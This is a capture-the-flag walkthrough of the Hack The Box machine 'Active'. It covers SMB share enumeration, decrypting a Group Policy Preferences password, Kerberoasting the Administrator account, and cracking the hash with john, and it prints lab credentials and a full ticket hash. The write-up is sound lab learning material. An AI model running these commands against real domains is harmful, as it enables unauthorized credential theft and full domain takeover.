# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.10.100
nmap -sU --top-ports=10 -vv 10.10.10.100
nmap -sT -p- 10.10.10.100

---OUTPUT-TCP---
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-18 18:05:46Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 16281/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 38631/udp): CLEAN (Timeout)
|   Check 4 (port 41710/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-18T18:06:44
|_  start_date: 2025-04-18T18:02:02

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127

---OUTPUT-3---
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
9389/tcp  open  adws             syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49165/tcp open  unknown          syn-ack
49166/tcp open  unknown          syn-ack
49168/tcp open  unknown          syn-ack

```
- domain : active.htb
- smb, kerberos, ldap
## SMB Enumeration and Initial Foothold
- We pass the commands:
```bash
smbclient -U '' -L //10.10.10.100 
smbclient -U '' -L //10.10.10.100 --password=''
smbclient -U 'guest' -L //10.10.10.100 --password=''
smbclient -U 'anonymous' -L //10.10.10.100 --password='anonymous'
```
- No hit. 
- Guest account disabled.
- We try with crackmapexec and get a hit with no credentials so we get shares:
```bash
crackmapexec smb 10.10.10.100 -u '' -p '' --shares

---OUTPUT---
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\: 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON                        Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL                          Logon server share 
SMB         10.10.10.100    445    DC               Users                           

```
- Then we try to login with no pwd with smbclient:
```bash
smbclient '\\10.10.10.100\Replication' -N
```
- Then after enumerating a lot I found a file Groups.xml
```bash
smb:> cd active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
smb:> get Groups.xml
smb:> exit
cat Groups.xml

---OUTPUT-GROUPS-XML---
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
- User SVC_TGS
- Encrypted Pwd: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`
- On searching google I see this has something to do with Group Policy Privileges exploit
- we can decrypt GPP passwords via the gpp-decrypt tool (inbuilt in kali but there is a github too : https://github.com/t0thkr1s/gpp-decrypt)
```bash
gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
---OUTPUT---
GPPstillStandingStrong2k18
```
- We check credentials with crackmapexec smb (fails with winrm):
```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'

---OUTPUT---
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```
- We list shares to see if we can access any more:
```bash
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares

---OUTPUT---
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            

```
- We can access Users
- We access the User smb share with credentials and grab user flag:
```bash
smbclient -U 'SVC_TGS' --password 'GPPstillStandingStrong2k18' //10.10.10.100/Users

smb:> dir
smb:> cd SVC_TGS/Desktop
more user.txt
```
## BloodHound and Privilege Escalation (Kerberoasting)
- We get the bloodhound files for analysis:
```bash
bloodhound-python --dns-tcp -ns 10.10.10.100 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -c all
```
- Although no path from SVC_TGS we do find administrator (and krbtgt) user is kerberoastable
- We attempt to grab the administrator's hash
```bash
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-04-18 14:03:11.326556             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bca759c87fa9bcdbd19ba0ab8f983e61$51d751a92fd8151afb015848db8b8d87480a7034a07ffeec58896b8c2d60ff540ea4fdaf6c279ff4e26ad9be68ccd096fd5bf6d969640cc5fda6a938de4a1fce0ff9bdb849c6454fd1227e266284824242b95bac71cf9598c2244476403a17cc5ec92b20c396a5f8e6e746f876023b2a16167158e7e8449719df519901fc71bb56ce17db4d37571fc94074994d239c8a7869f302d477e57994f2cdb14296780857ef0a800c6d682adb3a893d89025ac36f8fea9b3fcbe7a3c22e66da8f49981db0d56fab5896573ed9de8db7ee0b2e720bcea2d6dadcdd50e7d8c98aacb7c19d46cbd6c4d748a9109b00e8c8ceb655056c6f90d46e74a3348d2869a26ae5ed1eb413e4dfb2313bd9e6e98f8fa71a9f9bff8edcabbfdc7ed989d2a58b760c2ad5664177579a35a230d5e579bba7ee9af4817f79eb13ab6feaebc7fb69b5e5be0437a8e9ac90ae88172c3d9f5157d57f8de9b78a0e8bf1e292f97159703d88709bef57788993c0fb7c9f3bcbcba7cb7111ed84e5257724821bcbbaebef120ea3569b9936272b94ffed4d4df5d1e0ba2f24b9296cc0cabdf18f23a5aa617ce881bdfdb83e1010ef793220899cf1661949a63baa0bb02e316b05931060d0863aa5713a9f0af29f3ac1608a5595f06405966291a9f847500e94f985e6b6ad8fd8b6964be050ecc922d3b495b399c8968ea4e1c536932ed0cd74615d8d4c31e7e87329a9be64c7cca51636ac899d8aaf0e48f94e245152682741a6ad9afebcfbbbe8cdbbf9e6cc8500b8fe7716fa45ebb4b4a064ceddf83460129e739cc655f44e4b19f0ed628aa8dffe10b6f5943ceaec7b5d897e0c4c7c39cbdc20a052f3d4a5dfb1cc39ea7db526e0aab01214772d92a0e34ecf0d9dc686de29eac98cbe0632d963dc7fce2ab1d5dfd60df2a7e2a7ee79848d1332ab10cbfd8b48bb15749a67ed8d8a37f8a3991523bb6784e0b27d88f1fa98578e33931624a63f4eb09fdb0c7b1de600a8bf38343b30ee9ed84078dd01518675100574dd985de28d351f56ff420322188be9fe2e8bb63f5f8229b36a7f1c23f952430064f476a3fc79009abe840073173246185927fe9b9f77e637fe3ecc1a860b946541d6504b5ff914b95e8705947752bd4ded684f481f32d3e9e4628db162b2c5f763301e8d5a444e5eed9a1f9f2a05bc26ce0bb8090c1b5d02381b5468f24babf2cf9665bfcf06a62b4ed9f3306e825058f07fc10c46645fe06efedc95da5480f2bdcb2dfe15
```
- We attempt to crack the hash:
```bash
vi admin.hash > # copy hash here
john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Ticketmaster1968 (?)
```
- We check credentials with crackmapexec smb (once again fails with winrm)
```bash
crackmapexec smb 10.10.10.100 -u 'administrator' -p 'Ticketmaster1968'

---OUTPUT---
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\administrator:Ticketmaster1968 (Pwn3d!)
```
- We get a Pwned hit!
- We login to the User share with admin credentials:
```bash
smbclient -U 'administrator' --password 'Ticketmaster1968' //10.10.10.100/Users
smb: > cd Administrator\Desktop
smb: > more root.txt
```

-------
--------